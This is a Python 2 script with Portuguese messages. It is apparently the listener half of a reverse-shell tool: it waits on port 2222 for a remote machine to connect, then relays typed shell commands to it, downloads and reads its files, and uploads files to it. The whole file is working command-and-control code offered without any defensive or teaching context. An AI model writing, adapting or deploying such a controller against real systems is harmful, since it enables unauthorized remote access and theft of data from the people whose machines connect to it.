import socket,os,sys,threading
def download(conn,command):
    conn.send(command)
    f = open('server_file.py','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Download Completo '
            f.close()
            break
        f.write(bits)

def Cat(conn,command):
    conn.send(command)
    while True:
        bits = str(conn.recv(1024))
        if 'Unable to find out the file' in bits:
            break
        if bits.endswith('DONE'):
            break
        print(bits)
        

def mandaArq(s,path):
 try:
    pat = path[7:]
    caminho = str(os.getcwd())+'//'+pat
    if os.path.exists(caminho):
        print('Enviando arquivo %s ...'%pat)
        s.send('upload %s'%pat)
        f = open(caminho, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        print(s.recv(1024))
    
    

 except Exception,e:
     print('[-] Arquivo %s nao encontrado, erro:\n %s '%(pat,e))
     

def connect():
    ip = ''
    port = 2222
    try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(5)
     print('Listening at port: '+str(port))
     conn,addr = s.accept()
     print('[+] User connected : ',addr)

     while True:
        command = str(raw_input("CMD# >"))
        if 'quit' in command:
            conn.send('quit')
            conn.close()
            break
        
        elif 'download' in command:
            download(conn,command)

        elif 'cat' in command:
            Cat(conn,command)

        elif 'upload' in command:
            mandaArq(conn,command)
            
        else:
            conn.send(command)
            resposta = conn.recv(4096)
            if 'quit' in resposta:
                conn.close()
                break
            print(resposta)
    except:
        e = sys.exc_info()[0]
        print('[server]Erro ao se conectar \n [-]Erro S3RV3R : \n %s'%str(e))

def main():  
    client_handler = threading.Thread(target=connect,args=())
    client_handler.start()

main()
    
